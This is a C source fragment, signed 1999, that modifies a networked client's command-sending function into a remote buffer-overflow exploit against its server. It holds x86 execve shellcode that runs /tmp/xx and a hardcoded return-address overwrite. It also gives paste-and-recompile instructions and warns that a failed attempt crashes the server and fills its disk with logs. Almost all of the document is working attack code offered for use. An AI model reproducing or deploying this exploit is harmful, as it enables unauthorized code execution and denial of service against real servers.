/* If the offset is off for your box, then the server will still crash,
 and will begin an endless loop of sending itself log messages,
 filling up whatever space it can on whatever partition it's installed
 on. This is less than optimal behavior, so quickly find and kill the
 server if your exploit fails. 

       Love,
       A. Woodward, Dec 1999

<cut this and paste it into your client's source file, modify your
.h's to raise the limit on a few variables (grep for 256 and turn them
into 2560), recompile, and enjoy> */

/*
 *	Sends a literal command.
 */
/*hacked to send our attack buffer!*/

int 
NetSendExec(char *arg)
{
  char larg[CS_MESG_MAX];
  char sndbuf[CS_DATA_MAX_LEN];
  char exploitbuf[CS_DATA_MAX_LEN];
  int i;

  /*test shellcode. No whitespace, just exec's /tmp/xx. If it's not
    there, does random things. Replace this for slightly more
    fun. ;> */
      char code[] ="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
	   "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
	   "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/tmp/xx";
	

	
#define SIZEOFBUF 229
	memset(exploitbuf,0x41,SIZEOFBUF);

#define SHELLSTART 50
	memcpy(exploitbuf+SHELLSTART,code,strlen(code));
	
	/*Return to: 0xbfffebe4 Your Kilometerage May Vary*/
	exploitbuf[132]=0xe4;
	exploitbuf[133]=0xeb;
	exploitbuf[134]=0xff;
	exploitbuf[135]=0xbf;
	
	exploitbuf[SIZEOFBUF-1]=0;

	/*
	if(arg == NULL)
	    return(-1);
	if(arg[0] == '\0')
	    return(-2);
	*/

	/*strncpy(larg, arg, CS_MESG_MAX);*/
	strncpy(larg, exploitbuf, CS_MESG_MAX);
	larg[CS_MESG_MAX - 1] = '\0';
	

        /* 
         *   NET_CMD_EXEC format is as follows:
         *
         *      argument
         */
        sprintf(sndbuf, "%i %s\n",
                CS_CODE_LITERALCMD,
                larg
        );
        NetSendData(sndbuf);


	return(0);
}
